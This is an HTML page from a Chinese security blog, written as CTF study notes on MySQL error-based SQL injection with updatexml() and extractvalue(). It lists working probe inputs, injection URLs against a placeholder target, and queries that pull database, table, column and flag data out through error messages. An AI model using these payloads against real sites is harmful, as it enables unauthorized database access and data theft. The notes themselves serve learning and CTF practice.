@@ -1,0 +1,682 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试,SQLi,ctf,MySQL," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> MySQL updatexml()、extractvalue() 报错型SQL注入 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              MySQL updatexml()、extractvalue() 报错型SQL注入
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-11-09
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/11/09/updatexml-sqli/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/09/updatexml-sqli/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="关于-updatexml-函数"><a href="#关于-updatexml-函数" class="headerlink" title="关于 updatexml 函数"></a>关于 updatexml 函数</h1><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://www.target.com/index.php?id=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</div><div class="line"><span class="keyword">http</span>://www.target.com/index.php?<span class="keyword">id</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</div><div class="line"><span class="keyword">http</span>://www.target.com/index.php?<span class="keyword">id</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">SUBSTR</span>((<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">1</span>,<span class="number">24</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</div></pre></td></tr></table></figure>
+<p>另外，updatexml最多只能显示32位，需要配合<code>SUBSTR</code>使用。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,SUBSTR((SELECT f14g from f14g LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">24</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</div><div class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select substring(f14g,<span class="number">20</span>) from f14g limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</div><div class="line">extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(select database())))</div></pre></td></tr></table></figure>
+<h1 id="试探性-payloads"><a href="#试探性-payloads" class="headerlink" title="试探性 payloads"></a>试探性 payloads</h1><p>记得可以试试带上注释<code>&quot;-- &quot;</code>，注意注释符是含空格的。<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">id=%5c</span> <span class="literal">-</span><span class="literal">-</span></div><div class="line"><span class="comment">id='</span> <span class="literal">-</span><span class="literal">-</span></div><div class="line"><span class="comment">id="</span> <span class="literal">-</span><span class="literal">-</span></div><div class="line"><span class="comment">id==</span> <span class="literal">-</span><span class="literal">-</span></div><div class="line"><span class="comment">id=</span><span class="literal">-</span><span class="comment">1</span> <span class="literal">-</span><span class="literal">-</span></div><div class="line"><span class="comment">id=</span><span class="literal">-</span><span class="comment">0</span> <span class="literal">-</span><span class="literal">-</span></div><div class="line"><span class="comment">id=3</span><span class="literal">-</span><span class="comment">2</span> <span class="literal">-</span><span class="literal">-</span></div></pre></td></tr></table></figure></p>
+<p>后期payload<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">1 </span>&amp;&amp; extractvalue(<span class="number">0</span>x0a,concat(<span class="number">0</span>x0a,(select database())))#</div><div class="line"><span class="symbol">1 </span>&amp;&amp; extractvalue(<span class="number">0</span>x0a,concat(<span class="number">0</span>x0a,(select table_name from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>)))#</div><div class="line"><span class="symbol">1 </span>&amp;&amp; extractvalue(<span class="number">0</span>x0a,concat(<span class="number">0</span>x0a,(select column_name from information_schema.columns limit <span class="number">0</span>,<span class="number">1</span>)))#</div><div class="line"><span class="symbol">1 </span>&amp;&amp; extractvalue(<span class="number">0</span>x0a,concat(<span class="number">0</span>x0a,(select substr(f14g,<span class="number">1</span>,<span class="number">32</span>) from f14g)))#</div><div class="line"><span class="symbol">1 </span>&amp;&amp; extractvalue(<span class="number">0</span>x0a,concat(<span class="number">0</span>x0a,(select substr(f14g,<span class="number">15</span>,<span class="number">32</span>) from f14g)))#</div></pre></td></tr></table></figure></p>
+<h1 id="MySQL-信息收集"><a href="#MySQL-信息收集" class="headerlink" title="MySQL 信息收集"></a>MySQL 信息收集</h1><p>注入payload参考指南</p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank" rel="external">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></p>
+<p>注意 WHERE 的限制 即可以用<code>=</code>也可以用<code>LIKE</code></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># MySQL版本</div><div class="line"><span class="keyword">SELECT</span> @@version</div><div class="line"># 用户</div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>()</div><div class="line"># 数据库</div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">database</span>()</div><div class="line"># 表名</div><div class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></div><div class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema=<span class="string">"words"</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></div><div class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema <span class="keyword">LIKE</span> <span class="string">"%words%"</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></div><div class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">LIMIT</span> <span class="number">81</span>,<span class="number">1</span></div><div class="line"># 列名</div><div class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name=<span class="string">"f14g"</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></div><div class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="keyword">LIKE</span> <span class="string">"f14g"</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></div><div class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">LIMIT</span> <span class="number">808</span>,<span class="number">1</span></div><div class="line"># 查数据</div><div class="line"><span class="keyword">SELECT</span> f14g <span class="keyword">from</span> f14g <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></div><div class="line"># 关键payload</div><div class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="built_in">SUBSTR</span>((<span class="keyword">SELECT</span> f14g <span class="keyword">from</span> f14g <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">24</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</div></pre></td></tr></table></figure>
+<h1 id="案例-东华-永信至诚-2017-CTF题"><a href="#案例-东华-永信至诚-2017-CTF题" class="headerlink" title="案例 东华 永信至诚 2017 CTF题"></a>案例 东华 永信至诚 2017 CTF题</h1><h2 id="SOME-WORDS-100pt"><a href="#SOME-WORDS-100pt" class="headerlink" title="SOME WORDS 100pt"></a>SOME WORDS 100pt</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">select</span> <span class="selector-tag">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT <span class="variable">@@version</span>),<span class="number">0</span>x7e),<span class="number">1</span>);</div><div class="line"><span class="selector-tag">select</span> <span class="selector-tag">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT <span class="variable">@@version</span>),<span class="number">0</span>x7e),<span class="number">1</span>);</div><div class="line"><span class="selector-tag">http</span>:<span class="comment">//www.target.com/index.php?id=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span></div></pre></td></tr></table></figure>
+<p>调整关键字<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">id</span>=WHERE</div><div class="line"><span class="attr">id</span>=SELECT</div><div class="line"><span class="attr">id</span>=AND</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+            <a href="/tags/SQLi/"> #SQLi </a>
+          
+            <a href="/tags/ctf/"> #ctf </a>
+          
+            <a href="/tags/MySQL/"> #MySQL </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/09/php-properties-that-easily-cause-vulnerability/">PHP代码审计中的常见套路 检查相等时的漏洞</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/09/wireshark-basic/">CTF视角的Wireshark基础</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/11/09/updatexml-sqli/"
+               data-title="MySQL updatexml()、extractvalue() 报错型SQL注入" data-url="http://blkstone.github.io/2017/11/09/updatexml-sqli/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">474</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">142</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于-updatexml-函数"><span class="nav-number">1.</span> <span class="nav-text">关于 updatexml 函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#试探性-payloads"><span class="nav-number">2.</span> <span class="nav-text">试探性 payloads</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL-信息收集"><span class="nav-number">3.</span> <span class="nav-text">MySQL 信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#案例-东华-永信至诚-2017-CTF题"><span class="nav-number">4.</span> <span class="nav-text">案例 东华 永信至诚 2017 CTF题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SOME-WORDS-100pt"><span class="nav-number">4.1.</span> <span class="nav-text">SOME WORDS 100pt</span></a></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
